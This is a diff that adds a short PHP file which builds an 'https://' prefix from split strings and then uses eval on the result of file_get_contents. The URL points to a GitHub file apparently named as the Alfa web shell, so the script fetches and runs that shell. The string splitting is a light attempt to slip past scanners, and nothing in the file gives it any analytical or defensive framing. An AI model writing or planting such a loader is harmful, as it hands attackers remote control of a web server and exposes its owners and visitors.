@@ -1,0 +1,4 @@
+<?php
+$awo = 'htt'.'ps://';
+eval("?>".file_get_contents($awo.'raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/alfa-shell/alfa-pass.php'));
+?>
